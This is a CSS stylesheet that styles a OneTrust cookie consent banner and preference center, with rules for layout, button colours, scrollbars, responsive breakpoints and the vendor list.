            #ot-sdk-cookie-policy hr {
                margin-top: 3rem;
                margin-bottom: 3.5rem;
                border-width: 0;
                border-top: 1px solid #e1e1e1;
            }
            #onetrust-banner-sdk .ot-sdk-container:after,
            #onetrust-banner-sdk .ot-sdk-row:after,
            #onetrust-banner-sdk .ot-sdk-u-cf,
            #onetrust-pc-sdk .ot-sdk-container:after,
            #onetrust-pc-sdk .ot-sdk-row:after,
            #onetrust-pc-sdk .ot-sdk-u-cf,
            #ot-sdk-cookie-policy .ot-sdk-container:after,
            #ot-sdk-cookie-policy .ot-sdk-row:after,
            #ot-sdk-cookie-policy .ot-sdk-u-cf {
                content: "";
                display: table;
                clear: both;
            }
            #onetrust-banner-sdk .ot-sdk-row,
            #onetrust-pc-sdk .ot-sdk-row,
            #ot-sdk-cookie-policy .ot-sdk-row {
                margin: 0;
                max-width: none;
                display: block;
                margin: 0;
            }
            #onetrust-dark-filter {
                background: rgba(0, 0, 0, 0.5);
                z-index: 2147483646;
                width: 100%;
                height: 100%;
                overflow: hidden;
                position: absolute;
                top: 0;
                bottom: 0;
                left: 0;
            }
            #onetrust-banner-sdk.otCenterRounded {
                z-index: 2147483645;
                top: 10%;
                position: fixed;
                right: 0;
                background-color: #fff;
                width: 60%;
                max-width: 650px;
                border-radius: 2.5px;
                left: 1em;
                margin: 0 auto;
                font-size: 14px;
                max-height: 90%;
                overflow-x: hidden;
                overflow-y: auto;
            }
            #onetrust-banner-sdk::-webkit-scrollbar {
                width: 11px;
            }
            #onetrust-banner-sdk::-webkit-scrollbar-thumb {
                border-radius: 10px;
                background: #c1c1c1;
            }
            #onetrust-banner-sdk {
                scrollbar-arrow-color: #c1c1c1;
                scrollbar-darkshadow-color: #c1c1c1;
                scrollbar-face-color: #c1c1c1;
                scrollbar-shadow-color: #c1c1c1;
            }
            #onetrust-banner-sdk h3,
            #onetrust-banner-sdk p {
                color: dimgray;
            }
            #onetrust-banner-sdk #onetrust-policy {
                margin-top: 20px;
            }
            #onetrust-banner-sdk #onetrust-policy-title {
                float: left;
                text-align: left;
                font-size: 1.3em;
                line-height: 1.4;
                margin-bottom: 0;
                padding: 0 45px 10px 45px;
                width: calc(100% - 90px);
            }
            #onetrust-banner-sdk #onetrust-policy-text {
                clear: both;
                float: left;
                margin: 0 45px 30px 45px;
                font-size: 1em;
                line-height: 1.4;
            }
            #onetrust-banner-sdk #onetrust-policy-text * {
                line-height: inherit;
                font-size: inherit;
            }
            #onetrust-banner-sdk #onetrust-button-group-parent {
                padding: 0 45px 14px 45px;
                text-align: center;
            }
            #onetrust-banner-sdk #onetrust-button-group-parent:not(.has-reject-all-button) #onetrust-button-group {
                text-align: right;
            }
            #onetrust-banner-sdk #onetrust-button-group {
                text-align: center;
                display: inline-block;
                width: 100%;
            }
            #onetrust-banner-sdk #onetrust-reject-all-handler,
            #onetrust-banner-sdk #onetrust-pc-btn-handler {
                margin-right: 1em;
            }
            #onetrust-banner-sdk #onetrust-pc-btn-handler {
                border: 1px solid #6cc04a;
                max-width: 45%;
            }
            #onetrust-banner-sdk .banner-actions-container {
                float: right;
                width: 50%;
            }
            #onetrust-banner-sdk #onetrust-pc-btn-handler.cookie-setting-link {
                background-color: #fff;
                border: none;
                color: #6cc04a;
                text-decoration: underline;
                padding-left: 0;
            }
            #onetrust-banner-sdk #onetrust-accept-btn-handler,
            #onetrust-banner-sdk #onetrust-reject-all-handler,
            #onetrust-banner-sdk #onetrust-pc-btn-handler {
                background-color: #6cc04a;
                color: #fff;
                border-color: #6cc04a;
                min-width: 135px;
                padding: 12px 10px;
                font-size: 1em;
                letter-spacing: 0.05em;
                line-height: 1.4;
                height: auto;
                white-space: normal;
                word-break: break-word;
                word-wrap: break-word;
            }
            #onetrust-banner-sdk .has-reject-all-button #onetrust-pc-btn-handler {
                float: left;
                max-width: calc(40% - 18px);
            }
            #onetrust-banner-sdk .has-reject-all-button #onetrust-pc-btn-handler.cookie-setting-link {
                text-align: left;
                margin-right: 0;
            }
            #onetrust-banner-sdk .has-reject-all-button .banner-actions-container {
                max-width: 60%;
                width: auto;
            }
            #onetrust-banner-sdk .ot-close-icon {
                width: 0.8em;
                height: 18px;
                border: none;
                display: inline-block;
                padding: 0;
            }
            #onetrust-banner-sdk #onetrust-close-btn-container {
                float: right;
                margin-right: 20px;
            }
            #onetrust-banner-sdk .banner_logo {
                display: none;
            }
            #onetrust-banner-sdk #banner-options {
                float: left;
                padding: 0 45px 10px 45px;
                width: calc(100% - 90px);
            }
            #onetrust-banner-sdk #banner-options label {
                margin: 0;
                display: inline-block;
            }
            #onetrust-banner-sdk .banner-option {
                margin-bottom: 12px;
            }
            #onetrust-banner-sdk .banner-option-input {
                position: absolute;
                cursor: pointer;
                width: auto;
                height: 20px;
                opacity: 0;
            }
            #onetrust-banner-sdk .banner-option-input:checked ~ label .ot-arrow-container {
                transform: rotate(90deg);
            }
            #onetrust-banner-sdk .banner-option-input:checked ~ .banner-option-details {
                height: auto;
                display: block;
            }
            #onetrust-banner-sdk .banner-option-header {
                margin-bottom: 6px;
                cursor: pointer;
                display: inline-block;
            }
            #onetrust-banner-sdk .banner-option-header :first-child {
                font-size: 0.82em;
                line-height: 1.4;
                color: dimgray;
                font-weight: bold;
                float: left;
            }
            #onetrust-banner-sdk .ot-arrow-container,
            #onetrust-banner-sdk .banner-option-details {
                transition: all 300ms ease-in 0s;
                -webkit-transition: all 300ms ease-in 0s;
                -moz-transition: all 300ms ease-in 0s;
                -o-transition: all 300ms ease-in 0s;
            }
            #onetrust-banner-sdk .ot-arrow-container {
                display: inline-block;
                border-top: 6px solid transparent;
                border-bottom: 6px solid transparent;
                border-left: 6px solid dimgray;
                margin-left: 10px;
                margin-top: 2px;
            }
            #onetrust-banner-sdk .banner-option-details {
                display: none;
                font-size: 0.83em;
                line-height: 1.5;
                height: 0px;
                padding: 10px 10px 5px 10px;
            }
            #onetrust-banner-sdk .banner-option-details * {
                font-size: inherit;
                line-height: inherit;
                color: dimgray;
            }
            #onetrust-banner-sdk.ot-iab-2 #onetrust-policy-text {
                margin-bottom: 10px;
            }
            #onetrust-banner-sdk .ot-dpd-container {
                float: left;
                margin: 0 45px;
            }
            #onetrust-banner-sdk .ot-dpd-title {
                font-weight: bold;
                padding-bottom: 10px;
            }
            #onetrust-banner-sdk .ot-dpd-title,
            #onetrust-banner-sdk .ot-dpd-desc {
                font-size: 1em;
                line-height: 1.4;
            }
            #onetrust-banner-sdk .onetrust-vendors-list-handler {
                display: block;
                margin-left: 0px;
                margin-top: 10px;
            }
            #onetrust-banner-sdk.ot-bnr-flift {
                box-shadow: 0 0 18px rgba(0, 0, 0, 0.2);
            }
            #onetrust-banner-sdk.ot-bnr-flift #onetrust-policy {
                overflow: hidden;
            }
            #onetrust-banner-sdk.ot-bnr-flift #onetrust-policy-title {
                font-size: 1em;
                padding: 0 0 10px 30px;
            }
            #onetrust-banner-sdk.ot-bnr-flift #onetrust-button-group-parent {
                padding: 15px 30px;
            }
            #onetrust-banner-sdk.ot-bnr-flift #onetrust-policy-text,
            #onetrust-banner-sdk.ot-bnr-flift .ot-dpd-container {
                float: left;
                margin: 0 30px 10px 30px;
            }
            #onetrust-banner-sdk.ot-bnr-flift #onetrust-policy-text,
            #onetrust-banner-sdk.ot-bnr-flift .ot-dpd-desc {
                font-size: 0.813em;
                line-height: 1.5;
            }
            #onetrust-banner-sdk.ot-bnr-flift #onetrust-policy-text *,
            #onetrust-banner-sdk.ot-bnr-flift .ot-dpd-desc * {
                margin: 0;
            }
            #onetrust-banner-sdk.ot-bnr-flift #onetrust-policy-text a {
                font-weight: bold;
                margin-left: 5px;
            }
            #onetrust-banner-sdk.ot-bnr-flift .ot-dpd-desc {
                margin-bottom: 0;
            }
            #onetrust-banner-sdk.ot-bnr-flift #onetrust-accept-btn-handler,
            #onetrust-banner-sdk.ot-bnr-flift #onetrust-reject-all-handler,
            #onetrust-banner-sdk.ot-bnr-flift #onetrust-pc-btn-handler {
                font-size: 0.813em;
                font-weight: 600;
            }
            #onetrust-banner-sdk.ot-bnr-flift #banner-options {
                padding: 0 30px;
            }
            #onetrust-banner-sdk.ot-bnr-flift .banner-option-header {
                margin-bottom: 0;
            }
            #onetrust-banner-sdk.ot-bnr-flift .banner-option {
                margin-bottom: 10px;
            }
            #onetrust-banner-sdk.ot-bnr-flift .onetrust-vendors-list-handler {
                margin-top: 5px;
            }
            @media only screen and (max-width: 425px) {
                #onetrust-banner-sdk #onetrust-accept-btn-handler,
                #onetrust-banner-sdk #onetrust-reject-all-handler,
                #onetrust-banner-sdk #onetrust-pc-btn-handler {
                    width: 100%;
                    margin-bottom: 10px;
                }
                #onetrust-banner-sdk #onetrust-pc-btn-handler,
                #onetrust-banner-sdk #onetrust-reject-all-handler {
                    margin-right: 0;
                }
                #onetrust-banner-sdk .has-reject-all-button #onetrust-pc-btn-handler.cookie-setting-link {
                    text-align: center;
                }
                #onetrust-banner-sdk .banner-actions-container,
                #onetrust-banner-sdk #onetrust-pc-btn-handler {
                    width: 100%;
                    max-width: none;
                }
                #onetrust-banner-sdk.otCenterRounded {
                    left: 0;
                    width: 95%;
                    top: 50%;
                    transform: translateY(-50%);
                    -webkit-transform: translateY(-50%);
                }
            }
            @media only screen and (max-width: 600px) {
                #onetrust-banner-sdk .ot-sdk-container {
                    width: auto;
                    padding: 0;
                }
                #onetrust-banner-sdk #onetrust-policy-title {
                    padding: 0 22px 10px 22px;
                    width: calc(100% - 44px);
                }
                #onetrust-banner-sdk #onetrust-policy-text,
                #onetrust-banner-sdk .ot-dpd-container {
                    margin: 0 22px 15px 22px;
                    width: calc(100% - 44px);
                }
                #onetrust-banner-sdk #onetrust-button-group-parent {
                    padding: 0 22px 15px 22px;
                }
                #onetrust-banner-sdk #banner-options {
                    padding: 0 22px 10px 22px;
                    width: calc(100% - 44px);
                }
                #onetrust-banner-sdk .banner-option {
                    margin-bottom: 6px;
                }
                #onetrust-banner-sdk .has-reject-all-button #onetrust-pc-btn-handler {
                    float: none;
                    max-width: 100%;
                }
                #onetrust-banner-sdk .has-reject-all-button .banner-actions-container {
                    width: 100%;
                    text-align: center;
                    max-width: 100%;
                }
                #onetrust-banner-sdk.ot-bnr-flift #onetrust-policy-title {
                    padding-left: 22px;
                    width: calc(100% - 65px);
                }
                #onetrust-banner-sdk.ot-bnr-flift #onetrust-policy-text,
                #onetrust-banner-sdk.ot-bnr-flift .ot-dpd-container {
                    margin: 0 22px 10px 22px;
                }
                #onetrust-banner-sdk.ot-bnr-flift #onetrust-button-group-parent {
                    padding: 15px 22px;
                }
                #onetrust-banner-sdk.ot-bnr-flift #banner-options {
                    padding: 0 22px;
                }
            }
            @media only screen and (min-width: 426px) and (max-width: 896px) {
                #onetrust-banner-sdk.otCenterRounded {
                    left: 0;
                    top: 15%;
                    transform: translateY(-13%);
                    -webkit-transform: translateY(-13%);
                    max-width: 600px;
                    width: 95%;
                }
            }
            #onetrust-consent-sdk #onetrust-banner-sdk {
                background-color: #42145f;
            }
            #onetrust-consent-sdk #onetrust-policy-title,
            #onetrust-consent-sdk #onetrust-policy-text,
            #onetrust-consent-sdk .ot-dpd-desc,
            #onetrust-consent-sdk .ot-dpd-title,
            #onetrust-consent-sdk #onetrust-policy-text *:not(.onetrust-vendors-list-handler),
            #onetrust-consent-sdk .ot-dpd-desc *:not(.onetrust-vendors-list-handler),
            #onetrust-consent-sdk #onetrust-banner-sdk #banner-options * {
                color: #ffffff;
            }
            #onetrust-consent-sdk #onetrust-banner-sdk .banner-option-details {
                background-color: #e9e9e9;
            }
            #onetrust-consent-sdk #onetrust-accept-btn-handler,
            #onetrust-banner-sdk #onetrust-reject-all-handler {
                background-color: #1d7b8a;
                border-color: #1d7b8a;
                color: #ffffff;
            }
            #onetrust-consent-sdk #onetrust-pc-btn-handler.cookie-setting-link {
                border-color: #42145f;
                background-color: #42145f;
                color: #1d7b8a;
            }
            #onetrust-consent-sdk #onetrust-pc-btn-handler {
                color: #ffffff;
                border-color: #ffffff;
                background-color: #1d7b8a;
            }
            @media only screen and (max-width: 550px) {
                .optanon-alert-box-wrapper .optanon-alert-box-body {
                    width: auto;
                    margin: 40px 20px 24px 20px;
                }
                .optanon-alert-box-wrapper {
                    max-width: 95%;
                }
                .optanon-alert-box-notice banner-content {
                    max-width: 100%;
                }
                .optanon-alert-box-wrapper .optanon-alert-box-notice {
                    width: auto;
                }
                #optanon #optanon-popup-wrapper {
                    max-width: 95% !important;
                    padding: 10px 10px 10px 10px;
                }
                #optanon #optanon-popup-body {
                    max-width: 100% !important;
                }
                #optanon.modern #optanon-popup-top {
                    padding-bottom: 30px;
                }
            }
            #ot-sdk-btn {
                text-align: center !important;
                width: 150px !important;
                color: #fff !important;
                background-color: #1d7b8a !important;
                border: 1px solid #1d7b8a !important;
            }
            #ot-sdk-btn:focus {
                outline: 2px solid #23527c !important;
            }
            #ot-sdk-btn:hover {
                text-align: center !important;
                color: #1d7b8a !important;
                background-color: #fff !important;
            }
            #onetrust-pc-btn-handler {
                border-color: #1d7b8a !important;
            }

            #onetrust-pc-sdk #content {
                display: block;
            }
            #onetrust-pc-sdk #hosts-list-container .host-item > input[type="checkbox"] {
                transform: none;
            }
            #onetrust-pc-sdk *::-webkit-scrollbar {
                background: none;
            }
            #onetrust-pc-sdk *::-webkit-scrollbar-track-piece:vertical {
                box-shadow: none;
            }
            #onetrust-pc-sdk #vendors-list-header #vendor-search-handler {
                height: 31px !important;
            }
            #onetrust-pc-sdk #search-container #triangle {
                right: 120px;
            }

            #onetrust-pc-sdk.otPcCenter {
                position: fixed;
                margin: 0 auto;
                top: 5%;
                bottom: 10%;
                right: 0;
                left: 0;
                width: 40%;
                max-width: 575px;
                min-width: 575px;
                border-radius: 2.5px;
                z-index: 2147483647;
                background-color: #fff;
                -webkit-box-shadow: 0px 2px 10px -3px #999;
                -moz-box-shadow: 0px 2px 10px -3px #999;
                box-shadow: 0px 2px 10px -3px #999;
            }
            #onetrust-pc-sdk.otPcCenter[dir="rtl"] {
                right: 0;
                left: 0;
            }
            #onetrust-pc-sdk.ot-sdk-container {
                padding: 0;
            }
            #onetrust-pc-sdk #pc-title,
            #onetrust-pc-sdk #manage-cookies-text,
            #onetrust-pc-sdk .category-header,
            #onetrust-pc-sdk #vendors-list-title,
            #onetrust-pc-sdk #select-all-text-container p,
            #onetrust-pc-sdk .vendor-info .vendor-title,
            #onetrust-pc-sdk .ot-always-active {
                font-weight: bold;
                color: dimgray;
            }
            #onetrust-pc-sdk .category-header {
                float: left;
                width: calc(100% - 65px);
            }
            #onetrust-pc-sdk .category-item p {
                clear: both;
                float: left;
                margin-top: 10px;
                margin-bottom: 5px;
                line-height: 1.4;
                font-size: 0.82em;
                color: dimgray;
            }
            #onetrust-pc-sdk .pc-close-button {
                height: 10px;
                width: 10px;
            }
            #onetrust-pc-sdk #pc-title {
                float: left;
                font-size: 1.2em;
                line-height: 1.3;
                margin-bottom: 10px;
                width: 100%;
            }
            #onetrust-pc-sdk #pc-policy-text {
                clear: both;
                width: 100%;
                font-size: 0.82em;
                line-height: 1.4;
            }
            #onetrust-pc-sdk #pc-policy-text a {
                font-size: 1em;
                line-height: 1.2;
            }
            #onetrust-pc-sdk #pc-policy-text * {
                font-size: inherit;
            }
            #onetrust-pc-sdk #pc-policy-text ul li {
                padding: 10px 0px;
            }
            #onetrust-pc-sdk a {
                color: #656565;
                cursor: pointer;
            }
            #onetrust-pc-sdk a:hover {
                color: #3860be;
            }
            #onetrust-pc-sdk label {
                margin-bottom: 0;
            }
            #onetrust-pc-sdk button {
                max-width: 394px;
                padding: 12px 30px;
                line-height: 1;
                word-break: break-word;
                word-wrap: break-word;
                white-space: normal;
                font-weight: bold;
                height: auto;
            }
            #onetrust-pc-sdk #content {
                position: absolute;
                overflow-y: scroll;
                padding-left: 0px;
                padding-right: 30px;
                top: 20px;
                bottom: 20px;
                margin: 0 3px 0 50px;
                width: calc(100% - 83px);
            }
            #onetrust-pc-sdk #cookie-preferences .ot-always-active {
                float: right;
                clear: none;
                color: #3860be;
                margin: 0;
                font-size: 0.9em;
                line-height: 1.3;
            }
            #onetrust-pc-sdk #content::-webkit-scrollbar-track,
            #onetrust-pc-sdk .group-options::-webkit-scrollbar-track,
            #onetrust-pc-sdk #vendor-list-content::-webkit-scrollbar-track {
                margin-right: 20px;
            }
            #onetrust-pc-sdk #content::-webkit-scrollbar,
            #onetrust-pc-sdk .group-options::-webkit-scrollbar,
            #onetrust-pc-sdk #vendor-list-content::-webkit-scrollbar {
                width: 11px;
            }
            #onetrust-pc-sdk #content::-webkit-scrollbar-thumb,
            #onetrust-pc-sdk .group-options::-webkit-scrollbar-thumb,
            #onetrust-pc-sdk #vendor-list-content::-webkit-scrollbar-thumb {
                border-radius: 10px;
                background: #d8d8d8;
            }
            #onetrust-pc-sdk input[type="checkbox"]:focus + .accordion-header {
                outline: auto;
                outline-color: #007bff;
            }
            #onetrust-pc-sdk #content,
            #onetrust-pc-sdk #vendor-list-content,
            #onetrust-pc-sdk .group-options {
                scrollbar-arrow-color: #d8d8d8;
                scrollbar-darkshadow-color: #d8d8d8;
                scrollbar-face-color: #d8d8d8;
                scrollbar-shadow-color: #d8d8d8;
            }
            #onetrust-pc-sdk #accept-recommended-container {
                margin-bottom: 10px;
            }
            #onetrust-pc-sdk #accept-recommended-container button {
                float: left;
            }
            #onetrust-pc-sdk .save-preference-btn-handler {
                float: left;
            }
            #onetrust-pc-sdk .ot-pc-refuse-all-handler {
                float: left;
                margin-right: 10px;
            }
            #onetrust-pc-sdk #privacy-notice-link {
                text-decoration: underline;
            }
            #onetrust-pc-sdk .cookie-subgroups-container {
                display: inline-block;
                clear: both;
                width: 100%;
                margin-bottom: 10px;
            }
            #onetrust-pc-sdk .cookie-subgroup-toggle {
                float: right;
            }
            #onetrust-pc-sdk .cookie-subgroup-toggle.ot-always-active-subgroup {
                width: auto;
            }
            #onetrust-pc-sdk ul.cookie-subgroups {
                margin: 0;
                font-size: initial;
            }
            #onetrust-pc-sdk ul.cookie-subgroups li p,
            #onetrust-pc-sdk ul.cookie-subgroups li h6 {
                font-size: 0.7em;
                line-height: 1.4;
                color: dimgray;
            }
            #onetrust-pc-sdk ul.cookie-subgroups .ot-switch {
                min-height: auto;
            }
            #onetrust-pc-sdk ul.cookie-subgroups .ot-switch-nob {
                top: 0;
            }
            #onetrust-pc-sdk ul.cookie-subgroups .accordion-header {
                display: inline-block;
                width: 100%;
            }
            #onetrust-pc-sdk ul.cookie-subgroups .accordion-text {
                margin: 0;
            }
            #onetrust-pc-sdk ul.cookie-subgroups li {
                padding: 0;
                border: none;
            }
            #onetrust-pc-sdk ul.cookie-subgroups li h6 {
                position: relative;
                top: 5px;
                font-weight: bold;
                margin-bottom: 0;
                float: left;
            }
            #onetrust-pc-sdk li.cookie-subgroup {
                margin-left: 20px;
                overflow: auto;
            }
            #onetrust-pc-sdk li.cookie-subgroup > h6 {
                width: calc(100% - 70px);
            }
            #onetrust-pc-sdk .category-item p > ul,
            #onetrust-pc-sdk li.cookie-subgroup p > ul {
                margin: 0px;
                list-style: disc;
                margin-left: 15px;
                font-size: inherit;
            }
            #onetrust-pc-sdk .category-item p > ul li,
            #onetrust-pc-sdk li.cookie-subgroup p > ul li {
                font-size: inherit;
                padding-top: 10px;
                padding-left: 0px;
                padding-right: 0px;
                border: none;
            }
            #onetrust-pc-sdk .category-item p > ul li:last-child,
            #onetrust-pc-sdk li.cookie-subgroup p > ul li:last-child {
                padding-bottom: 10px;
            }
            #onetrust-pc-sdk .ot-switch.ot-hide-tgl {
                visibility: hidden;
            }
            #onetrust-pc-sdk .ot-switch.ot-hide-tgl * {
                visibility: hidden;
            }
            #onetrust-pc-sdk .pc-logo {
                height: 40px;
                width: 120px;
                margin-bottom: 10px;
            }
            #onetrust-pc-sdk .ot-pc-footer-logo {
                height: 25px;
                width: 138px;
                float: right;
                margin-top: 31px;
            }
            #onetrust-pc-sdk.otPcCenter[dir="rtl"] .ot-pc-footer-logo {
                direction: rtl;
            }
            #onetrust-pc-sdk .ot-toggle-group,
            #onetrust-pc-sdk .toggle,
            #onetrust-pc-sdk .ot-arrow-container {
                display: inline-block;
            }
            #onetrust-pc-sdk .ot-toggle-group {
                width: 70px;
                float: right;
            }
            #onetrust-pc-sdk .toggle {
                padding: 0;
                font-size: 100%;
            }
            #onetrust-pc-sdk .ot-arrow {
                width: 10px;
                margin-left: 15px;
            }
            #onetrust-pc-sdk button.ot-pill {
                border-radius: 20px;
                font-size: 0.75em;
                text-align: center;
                background-color: #3860be;
                border-color: #3860be;
                font-weight: 600;
                box-shadow: 0 0 10px 1px #cce1ff;
                width: 180px;
                color: #fff;
                height: auto;
                white-space: normal;
                word-break: break-word;
                word-wrap: break-word;
                padding: 10px;
                line-height: 1.2;
                letter-spacing: 0.05em;
            }
            #onetrust-pc-sdk button.ot-pill:first-child {
                margin-top: 10px;
            }
            #onetrust-pc-sdk .ot-arrow-container {
                margin-top: 1.2px;
            }
            #onetrust-pc-sdk .ot-arrow-container svg {
                -webkit-transition: all 300ms ease-in 0s;
                -moz-transition: all 300ms ease-in 0s;
                -o-transition: all 300ms ease-in 0s;
                transition: all 300ms ease-in 0s;
                height: 10px;
                width: 10px;
            }
            #onetrust-pc-sdk input:checked ~ .accordion-header .ot-arrow {
                transform: rotate(90deg);
                -o-transform: rotate(90deg);
                -ms-transform: rotate(90deg);
                -webkit-transform: rotate(90deg);
            }
            #onetrust-pc-sdk .ot-arrow {
                width: 10px;
                margin-left: 15px;
                transition: all 300ms ease-in 0s;
                -webkit-transition: all 300ms ease-in 0s;
                -moz-transition: all 300ms ease-in 0s;
                -o-transition: all 300ms ease-in 0s;
            }
            #onetrust-pc-sdk .category-vendors-list-container {
                margin-bottom: 0;
            }
            #onetrust-pc-sdk .category-host-list-container {
                margin-top: 10px;
            }
            #onetrust-pc-sdk .category-vendors-list-handler,
            #onetrust-pc-sdk .category-vendors-list-handler + a,
            #onetrust-pc-sdk .category-host-list-handler {
                clear: both;
                color: #3860be;
                margin-left: 0;
                font-size: 0.75em;
                text-decoration: none;
                float: left;
            }
            #onetrust-pc-sdk .category-vendors-list-handler:hover,
            #onetrust-pc-sdk .category-vendors-list-handler + a:hover,
            #onetrust-pc-sdk .category-host-list-handler:hover {
                color: #1883fd;
            }
            #onetrust-pc-sdk .category-vendors-list-handler + a {
                clear: none;
            }
            #onetrust-pc-sdk .category-vendors-list-handler + a::after {
                content: "";
                height: 15px;
                width: 15px;
                background-repeat: no-repeat;
                margin-left: 5px;
                float: right;
                background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 511.626 511.627'%3E%3Cg fill='%231276CE'%3E%3Cpath d='M392.857 292.354h-18.274c-2.669 0-4.859.855-6.563 2.573-1.718 1.708-2.573 3.897-2.573 6.563v91.361c0 12.563-4.47 23.315-13.415 32.262-8.945 8.945-19.701 13.414-32.264 13.414H82.224c-12.562 0-23.317-4.469-32.264-13.414-8.945-8.946-13.417-19.698-13.417-32.262V155.31c0-12.562 4.471-23.313 13.417-32.259 8.947-8.947 19.702-13.418 32.264-13.418h200.994c2.669 0 4.859-.859 6.57-2.57 1.711-1.713 2.566-3.9 2.566-6.567V82.221c0-2.662-.855-4.853-2.566-6.563-1.711-1.713-3.901-2.568-6.57-2.568H82.224c-22.648 0-42.016 8.042-58.102 24.125C8.042 113.297 0 132.665 0 155.313v237.542c0 22.647 8.042 42.018 24.123 58.095 16.086 16.084 35.454 24.13 58.102 24.13h237.543c22.647 0 42.017-8.046 58.101-24.13 16.085-16.077 24.127-35.447 24.127-58.095v-91.358c0-2.669-.856-4.859-2.574-6.57-1.713-1.718-3.903-2.573-6.565-2.573z'/%3E%3Cpath d='M506.199 41.971c-3.617-3.617-7.905-5.424-12.85-5.424H347.171c-4.948 0-9.233 1.807-12.847 5.424-3.617 3.615-5.428 7.898-5.428 12.847s1.811 9.233 5.428 12.85l50.247 50.248-186.147 186.151c-1.906 1.903-2.856 4.093-2.856 6.563 0 2.479.953 4.668 2.856 6.571l32.548 32.544c1.903 1.903 4.093 2.852 6.567 2.852s4.665-.948 6.567-2.852l186.148-186.148 50.251 50.248c3.614 3.617 7.898 5.426 12.847 5.426s9.233-1.809 12.851-5.426c3.617-3.616 5.424-7.898 5.424-12.847V54.818c-.001-4.952-1.814-9.232-5.428-12.847z'/%3E%3C/g%3E%3C/svg%3E");
            }
            #onetrust-pc-sdk .back-btn-handler {
                font-size: 1em;
                text-decoration: none;
                font-weight: bold;
                color: #2e3644;
                display: table-cell;
                vertical-align: middle;
            }
            #onetrust-pc-sdk .back-btn-handler p {
                display: inline-block;
                word-break: break-word;
                word-wrap: break-word;
                margin-bottom: 0;
                max-width: 70px;
                vertical-align: middle;
                color: #656565;
                font-size: 0.8em;
                font-weight: bold;
            }
            #onetrust-pc-sdk .back-btn-handler p:hover {
                opacity: 0.6;
            }
            #onetrust-pc-sdk #vendors-list-title {
                margin: 30px 0 15px 20px;
                font-size: 1em;
                text-align: left;
            }
            #onetrust-pc-sdk #vendors-list-header {
                margin: 20px 0 0 30px;
                height: auto;
                width: auto;
            }
            #onetrust-pc-sdk #vendors-list-header input::placeholder {
                color: #d4d4d4;
                font-style: italic;
            }
            #onetrust-pc-sdk #vendor-search-handler {
                height: 31px;
                width: 380px;
                border-radius: 50px;
                font-size: 0.8em;
                padding: 0 35px 0 15px;
                float: left;
                margin: 6px 12px 0 50px;
            }
            #onetrust-pc-sdk #vendor-list-content {
                position: relative;
                overflow-y: scroll;
                padding-left: 0px;
                top: 60px;
                bottom: 75px;
                margin-right: 7px;
                margin-left: 40px;
                max-width: 90%;
                min-width: 90%;
                height: calc(100% - 265px);
            }
            #onetrust-pc-sdk #vendor-list-content .ot-sdk-column {
                padding-right: 22px;
                padding-left: 10px;
            }
            #onetrust-pc-sdk #vendor-list-content.no-results {
                height: calc(100% - 300px);
            }
            #onetrust-pc-sdk #vendors-list {
                height: calc(100% - 12px);
                width: 100%;
                bottom: 0px;
            }
            #onetrust-pc-sdk #vendors-list .ot-toggle-group {
                top: 10px;
                width: 50px;
                right: 12px;
                position: absolute;
            }
            #onetrust-pc-sdk #vendors-list .ot-checkbox {
                height: auto;
            }
            #onetrust-pc-sdk #vendors-list .ot-arrow-container {
                float: right;
                position: relative;
            }
            #onetrust-pc-sdk .category-vendors-list-container {
                overflow: hidden;
            }
            #onetrust-pc-sdk #select-all-container {
                position: relative;
                height: auto;
                width: 100%;
                display: block;
                top: 43px;
                margin-bottom: 10px;
                padding-bottom: 4px;
                color: dimgray;
            }
            #onetrust-pc-sdk #select-all-container p {
                font-size: 0.75em;
                color: #6b6b6b;
                margin: 0;
                display: inline-block;
            }
            #onetrust-pc-sdk #select-all-container .ot-checkbox {
                height: auto;
                float: right;
                width: 160px;
                max-width: 160px;
                margin-right: 90px;
            }
            #onetrust-pc-sdk.ot-sdk-not-webkit #select-all-container .ot-checkbox {
                margin-right: 99px;
            }
            #onetrust-pc-sdk #back-arrow {
                height: 12px;
                width: 20px;
                display: inline-block;
                vertical-align: middle;
            }
            #onetrust-pc-sdk #search-container {
                width: 100%;
                left: 0;
                position: absolute;
                height: 45px;
                background-color: #f8f8f8;
            }
            #onetrust-pc-sdk #search-container > svg {
                width: 30px;
                height: 30px;
                position: relative;
                float: left;
                right: 42px;
                top: 6px;
            }
            #onetrust-pc-sdk #filter-btn-handler {
                border-radius: 17px;
                display: inline-block;
                position: relative;
                width: 32px;
                height: 32px;
                margin-top: 6px;
                right: 25px;
                -moz-transition: 0.1s ease;
                -o-transition: 0.1s ease;
                -webkit-transition: 1s ease;
                transition: 0.1s ease;
            }
            #onetrust-pc-sdk #filter-btn-handler span {
                margin-bottom: 0;
                line-height: 1.2;
                font-size: 1em;
                color: #2e3644;
                max-width: 100px;
                vertical-align: middle;
            }
            #onetrust-pc-sdk #filter-icon {
                width: 12px;
                height: 30px;
                margin: 3px 10px 0 10px;
                display: block;
                position: static;
                right: auto;
                top: auto;
            }
            #onetrust-pc-sdk #filter-btn-handler:hover {
                background-color: #3860be;
            }
            #onetrust-pc-sdk #filter-btn-handler:hover #filter-icon-path {
                fill: #fff;
            }
            #onetrust-pc-sdk .vendor-privacy-notice {
                color: #3860be;
                text-decoration: none;
                font-weight: 100;
                display: block;
                padding-top: 10px;
                transform: translate(0, 1%);
                -o-transform: translate(0, 1%);
                -ms-transform: translate(0, 1%);
                -webkit-transform: translate(0, 1%);
                position: relative;
                z-index: 2;
            }
            #onetrust-pc-sdk .vendor-privacy-notice * {
                font-size: inherit;
            }
            #onetrust-pc-sdk .vendor-privacy-notice:hover {
                text-decoration: underline;
            }
            #onetrust-pc-sdk .vendor-title {
                width: 130px;
                max-width: 130px;
                vertical-align: middle;
            }
            #onetrust-pc-sdk .vendor-info {
                width: 120px;
                height: auto;
                float: left;
                word-break: break-word;
                word-wrap: break-word;
                vertical-align: middle;
            }
            #onetrust-pc-sdk .vendor-purposes {
                transform: translate(150%, 150%);
                -o-transform: translate(150%, 150%);
                -ms-transform: translate(150%, 150%);
                -webkit-transform: translate(150%, 150%);
                vertical-align: bottom;
                height: auto;
                float: left;
                text-align: center;
            }
            #onetrust-pc-sdk .vendor-purposes p {
                margin-bottom: 0;
                font-weight: 500;
                float: left;
                word-break: break-word;
                word-wrap: break-word;
            }
            #onetrust-pc-sdk .vendor-purposes p,
            #onetrust-pc-sdk .vendor-privacy-notice {
                letter-spacing: 0.03em;
                font-size: 0.7em;
                font-weight: 400;
            }
            #onetrust-pc-sdk .vendor-options {
                min-height: 100px;
                border-radius: 2px;
                background-color: #f8f8f8;
            }
